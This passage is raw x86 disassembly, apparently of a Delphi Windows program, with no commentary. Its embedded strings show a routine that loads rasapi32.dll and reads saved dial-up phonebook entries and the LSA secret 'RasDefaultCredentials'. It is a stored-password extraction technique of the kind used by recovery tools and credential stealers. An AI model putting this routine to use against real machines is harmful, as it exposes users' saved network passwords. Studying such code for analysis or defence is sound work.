  407c26:	8d 04 c5 bc e9 40 00 	lea    0x40e9bc(,%eax,8),%eax
  407c2d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  407c30:	e8 df 9e ff ff       	call   0x401b14
  407c35:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407c38:	8d 04 c5 c0 e9 40 00 	lea    0x40e9c0(,%eax,8),%eax
  407c3f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407c42:	e8 cd 9e ff ff       	call   0x401b14
  407c47:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407c4a:	e8 71 9e ff ff       	call   0x401ac0
  407c4f:	eb 15                	jmp    0x407c66
  407c51:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407c54:	8b d3                	mov    %ebx,%edx
  407c56:	e8 41 a0 ff ff       	call   0x401c9c
  407c5b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  407c5e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407c61:	e8 f2 a0 ff ff       	call   0x401d58
  407c66:	83 fe 09             	cmp    $0x9,%esi
  407c69:	75 0d                	jne    0x407c78
  407c6b:	ff 45 f8             	incl   -0x8(%ebp)
  407c6e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407c71:	e8 4a 9e ff ff       	call   0x401ac0
  407c76:	33 f6                	xor    %esi,%esi
  407c78:	ff 45 f4             	incl   -0xc(%ebp)
  407c7b:	4f                   	dec    %edi
  407c7c:	0f 85 62 ff ff ff    	jne    0x407be4
  407c82:	33 c0                	xor    %eax,%eax
  407c84:	5a                   	pop    %edx
  407c85:	59                   	pop    %ecx
  407c86:	59                   	pop    %ecx
  407c87:	64 89 10             	mov    %edx,%fs:(%eax)
  407c8a:	68 a4 7c 40 00       	push   $0x407ca4
  407c8f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  407c92:	ba 04 00 00 00       	mov    $0x4,%edx
  407c97:	e8 48 9e ff ff       	call   0x401ae4
  407c9c:	c3                   	ret
  407c9d:	e9 6a 9b ff ff       	jmp    0x40180c
  407ca2:	eb eb                	jmp    0x407c8f
  407ca4:	5f                   	pop    %edi
  407ca5:	5e                   	pop    %esi
  407ca6:	5b                   	pop    %ebx
  407ca7:	8b e5                	mov    %ebp,%esp
  407ca9:	5d                   	pop    %ebp
  407caa:	c3                   	ret
  407cab:	90                   	nop
  407cac:	55                   	push   %ebp
  407cad:	8b ec                	mov    %esp,%ebp
  407caf:	81 c4 e8 fd ff ff    	add    $0xfffffde8,%esp
  407cb5:	53                   	push   %ebx
  407cb6:	33 d2                	xor    %edx,%edx
  407cb8:	89 55 fc             	mov    %edx,-0x4(%ebp)
  407cbb:	8b d8                	mov    %eax,%ebx
  407cbd:	33 c0                	xor    %eax,%eax
  407cbf:	55                   	push   %ebp
  407cc0:	68 81 7d 40 00       	push   $0x407d81
  407cc5:	64 ff 30             	push   %fs:(%eax)
  407cc8:	64 89 20             	mov    %esp,%fs:(%eax)
  407ccb:	8b c3                	mov    %ebx,%eax
  407ccd:	e8 ee 9d ff ff       	call   0x401ac0
  407cd2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407cd5:	ba 00 01 00 00       	mov    $0x100,%edx
  407cda:	e8 95 a3 ff ff       	call   0x402074
  407cdf:	c7 45 f8 ff 00 00 00 	movl   $0xff,-0x8(%ebp)
  407ce6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407ce9:	50                   	push   %eax
  407cea:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407ced:	e8 aa a2 ff ff       	call   0x401f9c
  407cf2:	50                   	push   %eax
  407cf3:	e8 e0 b7 ff ff       	call   0x4034d8
  407cf8:	85 c0                	test   %eax,%eax
  407cfa:	74 6f                	je     0x407d6b
  407cfc:	c7 45 f4 ff 00 00 00 	movl   $0xff,-0xc(%ebp)
  407d03:	c7 45 f0 ff 00 00 00 	movl   $0xff,-0x10(%ebp)
  407d0a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407d0d:	50                   	push   %eax
  407d0e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407d11:	50                   	push   %eax
  407d12:	8d 85 e8 fd ff ff    	lea    -0x218(%ebp),%eax
  407d18:	50                   	push   %eax
  407d19:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407d1c:	50                   	push   %eax
  407d1d:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  407d23:	50                   	push   %eax
  407d24:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407d27:	e8 70 a2 ff ff       	call   0x401f9c
  407d2c:	50                   	push   %eax
  407d2d:	6a 00                	push   $0x0
  407d2f:	e8 b4 b7 ff ff       	call   0x4034e8
  407d34:	85 c0                	test   %eax,%eax
  407d36:	74 33                	je     0x407d6b
  407d38:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  407d3e:	50                   	push   %eax
  407d3f:	e8 9c b7 ff ff       	call   0x4034e0
  407d44:	85 c0                	test   %eax,%eax
  407d46:	74 23                	je     0x407d6b
  407d48:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407d4b:	50                   	push   %eax
  407d4c:	8d 85 e8 fe ff ff    	lea    -0x118(%ebp),%eax
  407d52:	50                   	push   %eax
  407d53:	e8 fc fd ff ff       	call   0x407b54
  407d58:	8b c3                	mov    %ebx,%eax
  407d5a:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407d5d:	e8 4a 9f ff ff       	call   0x401cac
  407d62:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407d65:	50                   	push   %eax
  407d66:	e8 bd b8 ff ff       	call   0x403628
  407d6b:	33 c0                	xor    %eax,%eax
  407d6d:	5a                   	pop    %edx
  407d6e:	59                   	pop    %ecx
  407d6f:	59                   	pop    %ecx
  407d70:	64 89 10             	mov    %edx,%fs:(%eax)
  407d73:	68 88 7d 40 00       	push   $0x407d88
  407d78:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407d7b:	e8 40 9d ff ff       	call   0x401ac0
  407d80:	c3                   	ret
  407d81:	e9 86 9a ff ff       	jmp    0x40180c
  407d86:	eb f0                	jmp    0x407d78
  407d88:	5b                   	pop    %ebx
  407d89:	8b e5                	mov    %ebp,%esp
  407d8b:	5d                   	pop    %ebp
  407d8c:	c3                   	ret
  407d8d:	8d 40 00             	lea    0x0(%eax),%eax
  407d90:	53                   	push   %ebx
  407d91:	56                   	push   %esi
  407d92:	57                   	push   %edi
  407d93:	55                   	push   %ebp
  407d94:	8b da                	mov    %edx,%ebx
  407d96:	8b f0                	mov    %eax,%esi
  407d98:	8b c6                	mov    %esi,%eax
  407d9a:	e8 b1 9f ff ff       	call   0x401d50
  407d9f:	8b f8                	mov    %eax,%edi
  407da1:	03 ff                	add    %edi,%edi
  407da3:	66 89 3b             	mov    %di,(%ebx)
  407da6:	8b ef                	mov    %edi,%ebp
  407da8:	66 83 c5 02          	add    $0x2,%bp
  407dac:	66 89 6b 02          	mov    %bp,0x2(%ebx)
  407db0:	0f b7 c5             	movzwl %bp,%eax
  407db3:	e8 bc 93 ff ff       	call   0x401174
  407db8:	8b f8                	mov    %eax,%edi
  407dba:	89 7b 04             	mov    %edi,0x4(%ebx)
  407dbd:	0f b7 4b 02          	movzwl 0x2(%ebx),%ecx
  407dc1:	8b d7                	mov    %edi,%edx
  407dc3:	8b c6                	mov    %esi,%eax
  407dc5:	e8 5e ab ff ff       	call   0x402928
  407dca:	5d                   	pop    %ebp
  407dcb:	5f                   	pop    %edi
  407dcc:	5e                   	pop    %esi
  407dcd:	5b                   	pop    %ebx
  407dce:	c3                   	ret
  407dcf:	90                   	nop
  407dd0:	53                   	push   %ebx
  407dd1:	56                   	push   %esi
  407dd2:	57                   	push   %edi
  407dd3:	55                   	push   %ebp
  407dd4:	83 c4 dc             	add    $0xffffffdc,%esp
  407dd7:	8b e9                	mov    %ecx,%ebp
  407dd9:	8b fa                	mov    %edx,%edi
  407ddb:	8b f0                	mov    %eax,%esi
  407ddd:	33 db                	xor    %ebx,%ebx
  407ddf:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407de3:	33 c9                	xor    %ecx,%ecx
  407de5:	ba 18 00 00 00       	mov    $0x18,%edx
  407dea:	e8 25 96 ff ff       	call   0x401414
  407def:	54                   	push   %esp
  407df0:	56                   	push   %esi
  407df1:	8d 44 24 14          	lea    0x14(%esp),%eax
  407df5:	50                   	push   %eax
  407df6:	6a 00                	push   $0x0
  407df8:	e8 5f fd ff ff       	call   0x407b5c
  407dfd:	85 c0                	test   %eax,%eax
  407dff:	77 32                	ja     0x407e33
  407e01:	8d 54 24 04          	lea    0x4(%esp),%edx
  407e05:	8b c7                	mov    %edi,%eax
  407e07:	e8 84 ff ff ff       	call   0x407d90
  407e0c:	55                   	push   %ebp
  407e0d:	8d 44 24 08          	lea    0x8(%esp),%eax
  407e11:	50                   	push   %eax
  407e12:	8b 44 24 08          	mov    0x8(%esp),%eax
  407e16:	50                   	push   %eax
  407e17:	e8 48 fd ff ff       	call   0x407b64
  407e1c:	85 c0                	test   %eax,%eax
  407e1e:	0f 94 c3             	sete   %bl
  407e21:	8b 44 24 08          	mov    0x8(%esp),%eax
  407e25:	e8 62 93 ff ff       	call   0x40118c
  407e2a:	8b 04 24             	mov    (%esp),%eax
  407e2d:	50                   	push   %eax
  407e2e:	e8 39 fd ff ff       	call   0x407b6c
  407e33:	8b c3                	mov    %ebx,%eax
  407e35:	83 c4 24             	add    $0x24,%esp
  407e38:	5d                   	pop    %ebp
  407e39:	5f                   	pop    %edi
  407e3a:	5e                   	pop    %esi
  407e3b:	5b                   	pop    %ebx
  407e3c:	c3                   	ret
  407e3d:	8d 40 00             	lea    0x0(%eax),%eax
  407e40:	55                   	push   %ebp
  407e41:	8b ec                	mov    %esp,%ebp
  407e43:	6a 00                	push   $0x0
  407e45:	6a 00                	push   $0x0
  407e47:	6a 00                	push   $0x0
  407e49:	33 c0                	xor    %eax,%eax
  407e4b:	55                   	push   %ebp
  407e4c:	68 f8 7e 40 00       	push   $0x407ef8
  407e51:	64 ff 30             	push   %fs:(%eax)
  407e54:	64 89 20             	mov    %esp,%fs:(%eax)
  407e57:	68 0c 7f 40 00       	push   $0x407f0c
  407e5c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407e5f:	e8 48 fe ff ff       	call   0x407cac
  407e64:	ff 75 f4             	push   -0xc(%ebp)
  407e67:	68 24 7f 40 00       	push   $0x407f24
  407e6c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407e6f:	ba 03 00 00 00       	mov    $0x3,%edx
  407e74:	e8 97 9f ff ff       	call   0x401e10
  407e79:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407e7c:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407e7f:	b8 04 00 00 00       	mov    $0x4,%eax
  407e84:	e8 47 ff ff ff       	call   0x407dd0
  407e89:	84 c0                	test   %al,%al
  407e8b:	74 1d                	je     0x407eaa
  407e8d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407e90:	0f b7 10             	movzwl (%eax),%edx
  407e93:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407e96:	8b 40 04             	mov    0x4(%eax),%eax
  407e99:	e8 f6 fc ff ff       	call   0x407b94
  407e9e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ea1:	8b 40 04             	mov    0x4(%eax),%eax
  407ea4:	50                   	push   %eax
  407ea5:	e8 ca fc ff ff       	call   0x407b74
  407eaa:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407ead:	ba 30 7f 40 00       	mov    $0x407f30,%edx
  407eb2:	b8 04 00 00 00       	mov    $0x4,%eax
  407eb7:	e8 14 ff ff ff       	call   0x407dd0
  407ebc:	84 c0                	test   %al,%al
  407ebe:	74 1d                	je     0x407edd
  407ec0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ec3:	0f b7 10             	movzwl (%eax),%edx
  407ec6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ec9:	8b 40 04             	mov    0x4(%eax),%eax
  407ecc:	e8 c3 fc ff ff       	call   0x407b94
  407ed1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407ed4:	8b 40 04             	mov    0x4(%eax),%eax
  407ed7:	50                   	push   %eax
  407ed8:	e8 97 fc ff ff       	call   0x407b74
  407edd:	33 c0                	xor    %eax,%eax
  407edf:	5a                   	pop    %edx
  407ee0:	59                   	pop    %ecx
  407ee1:	59                   	pop    %ecx
  407ee2:	64 89 10             	mov    %edx,%fs:(%eax)
  407ee5:	68 ff 7e 40 00       	push   $0x407eff
  407eea:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407eed:	ba 02 00 00 00       	mov    $0x2,%edx
  407ef2:	e8 ed 9b ff ff       	call   0x401ae4
  407ef7:	c3                   	ret
  407ef8:	e9 0f 99 ff ff       	jmp    0x40180c
  407efd:	eb eb                	jmp    0x407eea
  407eff:	8b e5                	mov    %ebp,%esp
  407f01:	5d                   	pop    %ebp
  407f02:	c3                   	ret
  407f03:	00 ff                	add    %bh,%bh
  407f05:	ff                   	(bad)
  407f06:	ff                   	(bad)
  407f07:	ff 0e                	decl   (%esi)
  407f09:	00 00                	add    %al,(%eax)
  407f0b:	00 52 61             	add    %dl,0x61(%edx)
  407f0e:	73 44                	jae    0x407f54
  407f10:	69 61 6c 50 61 72 61 	imul   $0x61726150,0x6c(%ecx),%esp
  407f17:	6d                   	insl   (%dx),%es:(%edi)
  407f18:	73 21                	jae    0x407f3b
  407f1a:	00 00                	add    %al,(%eax)
  407f1c:	ff                   	(bad)
  407f1d:	ff                   	(bad)
  407f1e:	ff                   	(bad)
  407f1f:	ff 02                	incl   (%edx)
  407f21:	00 00                	add    %al,(%eax)
  407f23:	00 23                	add    %ah,(%ebx)
  407f25:	30 00                	xor    %al,(%eax)
  407f27:	00 ff                	add    %bh,%bh
  407f29:	ff                   	(bad)
  407f2a:	ff                   	(bad)
  407f2b:	ff 1a                	lcall  *(%edx)
  407f2d:	00 00                	add    %al,(%eax)
  407f2f:	00 4c 24 5f          	add    %cl,0x5f(%esp)
  407f33:	52                   	push   %edx
  407f34:	61                   	popa
  407f35:	73 44                	jae    0x407f7b
  407f37:	65 66 61             	gs popaw
  407f3a:	75 6c                	jne    0x407fa8
  407f3c:	74 43                	je     0x407f81
  407f3e:	72 65                	jb     0x407fa5
  407f40:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407f43:	74 69                	je     0x407fae
  407f45:	61                   	popa
  407f46:	6c                   	insb   (%dx),%es:(%edi)
  407f47:	73 23                	jae    0x407f6c
  407f49:	30 00                	xor    %al,(%eax)
  407f4b:	00 53 56             	add    %dl,0x56(%ebx)
  407f4e:	8b da                	mov    %edx,%ebx
  407f50:	8b f0                	mov    %eax,%esi
  407f52:	8b c3                	mov    %ebx,%eax
  407f54:	b9 a8 7f 40 00       	mov    $0x407fa8,%ecx
  407f59:	8b d6                	mov    %esi,%edx
  407f5b:	e8 3c 9e ff ff       	call   0x401d9c
  407f60:	8b c3                	mov    %ebx,%eax
  407f62:	e8 35 a0 ff ff       	call   0x401f9c
  407f67:	50                   	push   %eax
  407f68:	e8 63 b7 ff ff       	call   0x4036d0
  407f6d:	8b d0                	mov    %eax,%edx
  407f6f:	8b c3                	mov    %ebx,%eax
  407f71:	e8 fe a0 ff ff       	call   0x402074
  407f76:	8b 03                	mov    (%ebx),%eax
  407f78:	e8 d3 9d ff ff       	call   0x401d50
  407f7d:	8b 13                	mov    (%ebx),%edx
  407f7f:	80 3c 02 5c          	cmpb   $0x5c,(%edx,%eax,1)
  407f83:	74 0c                	je     0x407f91
  407f85:	8b c3                	mov    %ebx,%eax
  407f87:	ba b4 7f 40 00       	mov    $0x407fb4,%edx
  407f8c:	e8 c7 9d ff ff       	call   0x401d58
  407f91:	8b c3                	mov    %ebx,%eax
  407f93:	ba c0 7f 40 00       	mov    $0x407fc0,%edx
  407f98:	e8 bb 9d ff ff       	call   0x401d58
  407f9d:	5e                   	pop    %esi
  407f9e:	5b                   	pop    %ebx
  407f9f:	c3                   	ret
  407fa0:	ff                   	(bad)
  407fa1:	ff                   	(bad)
  407fa2:	ff                   	(bad)
  407fa3:	ff 01                	incl   (%ecx)
  407fa5:	00 00                	add    %al,(%eax)
  407fa7:	00 00                	add    %al,(%eax)
  407fa9:	00 00                	add    %al,(%eax)
  407fab:	00 ff                	add    %bh,%bh
  407fad:	ff                   	(bad)
  407fae:	ff                   	(bad)
  407faf:	ff 01                	incl   (%ecx)
  407fb1:	00 00                	add    %al,(%eax)
  407fb3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  407fb7:	00 ff                	add    %bh,%bh
  407fb9:	ff                   	(bad)
  407fba:	ff                   	(bad)
  407fbb:	ff 2e                	ljmp   *(%esi)
  407fbd:	00 00                	add    %al,(%eax)
  407fbf:	00 4d 69             	add    %cl,0x69(%ebp)
  407fc2:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407fc5:	73 6f                	jae    0x408036
  407fc7:	66 74 5c             	data16 je 0x408026
  407fca:	4e                   	dec    %esi
  407fcb:	65 74 77             	gs je  0x408045
  407fce:	6f                   	outsl  %ds:(%esi),(%dx)
  407fcf:	72 6b                	jb     0x40803c
  407fd1:	5c                   	pop    %esp
  407fd2:	43                   	inc    %ebx
  407fd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fd6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407fdb:	6e                   	outsb  %ds:(%esi),(%dx)
  407fdc:	73 5c                	jae    0x40803a
  407fde:	70 62                	jo     0x408042
  407fe0:	6b 5c 72 61 73       	imul   $0x73,0x61(%edx,%esi,2),%ebx
  407fe5:	70 68                	jo     0x40804f
  407fe7:	6f                   	outsl  %ds:(%esi),(%dx)
  407fe8:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe9:	65 2e 70 62          	gs jo,pn 0x40804f
  407fed:	6b 00 00             	imul   $0x0,(%eax),%eax
  407ff0:	81 c4 f0 fe ff ff    	add    $0xfffffef0,%esp
  407ff6:	c7 04 24 08 01 00 00 	movl   $0x108,(%esp)
  407ffd:	8b 04 24             	mov    (%esp),%eax
  408000:	89 44 24 08          	mov    %eax,0x8(%esp)
  408004:	8d 44 24 04          	lea    0x4(%esp),%eax
  408008:	50                   	push   %eax
  408009:	8d 44 24 04          	lea    0x4(%esp),%eax
  40800d:	50                   	push   %eax
  40800e:	8d 44 24 10          	lea    0x10(%esp),%eax
  408012:	50                   	push   %eax
  408013:	6a 00                	push   $0x0
  408015:	6a 00                	push   $0x0
  408017:	e8 68 fb ff ff       	call   0x407b84
  40801c:	3d 5b 02 00 00       	cmp    $0x25b,%eax
  408021:	74 04                	je     0x408027
  408023:	85 c0                	test   %eax,%eax
  408025:	75 06                	jne    0x40802d
  408027:	8b 44 24 04          	mov    0x4(%esp),%eax
  40802b:	eb 02                	jmp    0x40802f
  40802d:	33 c0                	xor    %eax,%eax
  40802f:	81 c4 10 01 00 00    	add    $0x110,%esp
  408035:	c3                   	ret
  408036:	8b c0                	mov    %eax,%eax
  408038:	57                   	push   %edi
  408039:	56                   	push   %esi
  40803a:	53                   	push   %ebx
  40803b:	89 c6                	mov    %eax,%esi
  40803d:	89 d7                	mov    %edx,%edi
  40803f:	89 cb                	mov    %ecx,%ebx
  408041:	32 c0                	xor    %al,%al
  408043:	85 c9                	test   %ecx,%ecx
  408045:	74 05                	je     0x40804c
  408047:	f2 ae                	repnz scas %es:(%edi),%al
  408049:	75 01                	jne    0x40804c
  40804b:	41                   	inc    %ecx
  40804c:	29 cb                	sub    %ecx,%ebx
  40804e:	89 f7                	mov    %esi,%edi
  408050:	89 d6                	mov    %edx,%esi
  408052:	89 fa                	mov    %edi,%edx
  408054:	89 d9                	mov    %ebx,%ecx
  408056:	c1 e9 02             	shr    $0x2,%ecx
  408059:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40805b:	89 d9                	mov    %ebx,%ecx
  40805d:	83 e1 03             	and    $0x3,%ecx
  408060:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408062:	aa                   	stos   %al,%es:(%edi)
  408063:	89 d0                	mov    %edx,%eax
  408065:	5b                   	pop    %ebx
  408066:	5e                   	pop    %esi
  408067:	5f                   	pop    %edi
  408068:	c3                   	ret
  408069:	8d 40 00             	lea    0x0(%eax),%eax
  40806c:	55                   	push   %ebp
  40806d:	8b ec                	mov    %esp,%ebp
  40806f:	6a 00                	push   $0x0
  408071:	6a 00                	push   $0x0
  408073:	53                   	push   %ebx
  408074:	56                   	push   %esi
  408075:	8b f0                	mov    %eax,%esi
  408077:	33 c0                	xor    %eax,%eax
  408079:	55                   	push   %ebp
  40807a:	68 82 81 40 00       	push   $0x408182
  40807f:	64 ff 30             	push   %fs:(%eax)
  408082:	64 89 20             	mov    %esp,%fs:(%eax)
  408085:	33 db                	xor    %ebx,%ebx
  408087:	80 3d 94 d0 40 00 00 	cmpb   $0x0,0x40d094
  40808e:	0f 85 8e 00 00 00    	jne    0x408122
  408094:	68 94 81 40 00       	push   $0x408194
  408099:	e8 92 b5 ff ff       	call   0x403630
  40809e:	a3 b8 e9 40 00       	mov    %eax,0x40e9b8
  4080a3:	83 3d b8 e9 40 00 00 	cmpl   $0x0,0x40e9b8
  4080aa:	74 35                	je     0x4080e1
  4080ac:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4080af:	b9 ac 81 40 00       	mov    $0x4081ac,%ecx
  4080b4:	8b d6                	mov    %esi,%edx
  4080b6:	e8 e1 9c ff ff       	call   0x401d9c
  4080bb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4080be:	e8 85 9e ff ff       	call   0x401f48
  4080c3:	50                   	push   %eax
  4080c4:	a1 b8 e9 40 00       	mov    0x40e9b8,%eax
  4080c9:	50                   	push   %eax
  4080ca:	e8 41 b5 ff ff       	call   0x403610
  4080cf:	8b d8                	mov    %eax,%ebx
  4080d1:	85 db                	test   %ebx,%ebx
  4080d3:	74 1b                	je     0x4080f0
  4080d5:	c6 05 94 d0 40 00 01 	movb   $0x1,0x40d094
  4080dc:	e9 86 00 00 00       	jmp    0x408167
  4080e1:	68 b0 81 40 00       	push   $0x4081b0
  4080e6:	e8 45 b5 ff ff       	call   0x403630
  4080eb:	a3 b8 e9 40 00       	mov    %eax,0x40e9b8
  4080f0:	83 3d b8 e9 40 00 00 	cmpl   $0x0,0x40e9b8
  4080f7:	74 6e                	je     0x408167
  4080f9:	8b c6                	mov    %esi,%eax
  4080fb:	e8 48 9e ff ff       	call   0x401f48
  408100:	50                   	push   %eax
  408101:	a1 b8 e9 40 00       	mov    0x40e9b8,%eax
  408106:	50                   	push   %eax
  408107:	e8 04 b5 ff ff       	call   0x403610
  40810c:	8b d8                	mov    %eax,%ebx
  40810e:	85 db                	test   %ebx,%ebx
  408110:	74 55                	je     0x408167
  408112:	c6 05 94 d0 40 00 01 	movb   $0x1,0x40d094
  408119:	c6 05 98 d0 40 00 01 	movb   $0x1,0x40d098
  408120:	eb 45                	jmp    0x408167
  408122:	80 3d 98 d0 40 00 00 	cmpb   $0x0,0x40d098
  408129:	74 17                	je     0x408142
  40812b:	8b c6                	mov    %esi,%eax
  40812d:	e8 16 9e ff ff       	call   0x401f48
  408132:	50                   	push   %eax
  408133:	a1 b8 e9 40 00       	mov    0x40e9b8,%eax
  408138:	50                   	push   %eax
  408139:	e8 d2 b4 ff ff       	call   0x403610
  40813e:	8b d8                	mov    %eax,%ebx
  408140:	eb 25                	jmp    0x408167
  408142:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408145:	b9 ac 81 40 00       	mov    $0x4081ac,%ecx
  40814a:	8b d6                	mov    %esi,%edx
  40814c:	e8 4b 9c ff ff       	call   0x401d9c
  408151:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408154:	e8 ef 9d ff ff       	call   0x401f48
  408159:	50                   	push   %eax
  40815a:	a1 b8 e9 40 00       	mov    0x40e9b8,%eax
  40815f:	50                   	push   %eax
  408160:	e8 ab b4 ff ff       	call   0x403610
  408165:	8b d8                	mov    %eax,%ebx
  408167:	33 c0                	xor    %eax,%eax
  408169:	5a                   	pop    %edx
  40816a:	59                   	pop    %ecx
  40816b:	59                   	pop    %ecx
  40816c:	64 89 10             	mov    %edx,%fs:(%eax)
  40816f:	68 89 81 40 00       	push   $0x408189
  408174:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408177:	ba 02 00 00 00       	mov    $0x2,%edx
  40817c:	e8 63 99 ff ff       	call   0x401ae4
  408181:	c3                   	ret
  408182:	e9 85 96 ff ff       	jmp    0x40180c
  408187:	eb eb                	jmp    0x408174
  408189:	8b c3                	mov    %ebx,%eax
  40818b:	5e                   	pop    %esi
  40818c:	5b                   	pop    %ebx
  40818d:	59                   	pop    %ecx
  40818e:	59                   	pop    %ecx
  40818f:	5d                   	pop    %ebp
  408190:	c3                   	ret
  408191:	00 00                	add    %al,(%eax)
  408193:	00 72 61             	add    %dh,0x61(%edx)
  408196:	73 61                	jae    0x4081f9
  408198:	70 69                	jo     0x408203
  40819a:	33 32                	xor    (%edx),%esi
  40819c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40819f:	6c                   	insb   (%dx),%es:(%edi)
  4081a0:	00 00                	add    %al,(%eax)
  4081a2:	00 00                	add    %al,(%eax)
  4081a4:	ff                   	(bad)
  4081a5:	ff                   	(bad)
  4081a6:	ff                   	(bad)
  4081a7:	ff 01                	incl   (%ecx)
  4081a9:	00 00                	add    %al,(%eax)
  4081ab:	00 41 00             	add    %al,0x0(%ecx)
  4081ae:	00 00                	add    %al,(%eax)
  4081b0:	72 6e                	jb     0x408220
  4081b2:	61                   	popa
  4081b3:	70 68                	jo     0x40821d
  4081b5:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4081b8:	6c                   	insb   (%dx),%es:(%edi)
  4081b9:	00 00                	add    %al,(%eax)
  4081bb:	00 55 8b             	add    %dl,-0x75(%ebp)
  4081be:	ec                   	in     (%dx),%al
  4081bf:	51                   	push   %ecx
  4081c0:	53                   	push   %ebx
  4081c1:	56                   	push   %esi
  4081c2:	57                   	push   %edi
  4081c3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4081c6:	8b fa                	mov    %edx,%edi
  4081c8:	8b f0                	mov    %eax,%esi
  4081ca:	b8 fc 81 40 00       	mov    $0x4081fc,%eax
  4081cf:	e8 98 fe ff ff       	call   0x40806c
  4081d4:	89 c3                	mov    %eax,%ebx
  4081d6:	8b 45 08             	mov    0x8(%ebp),%eax
  4081d9:	50                   	push   %eax
  4081da:	8b 45 0c             	mov    0xc(%ebp),%eax
  4081dd:	50                   	push   %eax
  4081de:	8b 45 10             	mov    0x10(%ebp),%eax
  4081e1:	50                   	push   %eax
  4081e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081e5:	50                   	push   %eax
  4081e6:	57                   	push   %edi
  4081e7:	56                   	push   %esi
  4081e8:	ff d3                	call   *%ebx
  4081ea:	5f                   	pop    %edi
  4081eb:	5e                   	pop    %esi
  4081ec:	5b                   	pop    %ebx
  4081ed:	59                   	pop    %ecx
  4081ee:	5d                   	pop    %ebp
  4081ef:	c2 0c 00             	ret    $0xc
  4081f2:	00 00                	add    %al,(%eax)
  4081f4:	ff                   	(bad)
  4081f5:	ff                   	(bad)
  4081f6:	ff                   	(bad)
  4081f7:	ff 15 00 00 00 52    	call   *0x52000000
  4081fd:	61                   	popa
  4081fe:	73 47                	jae    0x408247
  408200:	65 74 45             	gs je  0x408248
  408203:	6e                   	outsb  %ds:(%esi),(%dx)
  408204:	74 72                	je     0x408278
  408206:	79 50                	jns    0x408258
  408208:	72 6f                	jb     0x408279
  40820a:	70 65                	jo     0x408271
  40820c:	72 74                	jb     0x408282
  40820e:	69 65 73 00 00 00 18 	imul   $0x18000000,0x73(%ebp),%esp
  408215:	82 40 00 11          	addb   $0x11,0x0(%eax)
  408219:	02 2e                	add    (%esi),%ch
  40821b:	33 08                	xor    (%eax),%ecx
  40821d:	01 00                	add    %eax,(%eax)
  40821f:	00 00                	add    %al,(%eax)
  408221:	00 00                	add    %al,(%eax)
  408223:	00 ff                	add    %bh,%bh
  408225:	ff                   	(bad)
  408226:	ff                   	(bad)
  408227:	ff 00                	incl   (%eax)
  408229:	00 00                	add    %al,(%eax)
  40822b:	00 0a                	add    %cl,(%edx)
  40822d:	75 52                	jne    0x408281
  40822f:	41                   	inc    %ecx
  408230:	53                   	push   %ebx
  408231:	52                   	push   %edx
  408232:	65 61                	gs popa
  408234:	64 65 72 90          	fs gs jb 0x4081c8
  408238:	55                   	push   %ebp
  408239:	8b ec                	mov    %esp,%ebp
  40823b:	81 c4 28 f3 ff ff    	add    $0xfffff328,%esp
  408241:	53                   	push   %ebx
  408242:	56                   	push   %esi
  408243:	57                   	push   %edi
  408244:	33 d2                	xor    %edx,%edx
  408246:	89 95 2c f3 ff ff    	mov    %edx,-0xcd4(%ebp)
  40824c:	89 95 28 f3 ff ff    	mov    %edx,-0xcd8(%ebp)
  408252:	89 95 30 f4 ff ff    	mov    %edx,-0xbd0(%ebp)
  408258:	89 95 34 f4 ff ff    	mov    %edx,-0xbcc(%ebp)
  40825e:	89 55 ec             	mov    %edx,-0x14(%ebp)
  408261:	89 55 e8             	mov    %edx,-0x18(%ebp)
  408264:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408267:	89 55 dc             	mov    %edx,-0x24(%ebp)
  40826a:	89 55 d8             	mov    %edx,-0x28(%ebp)
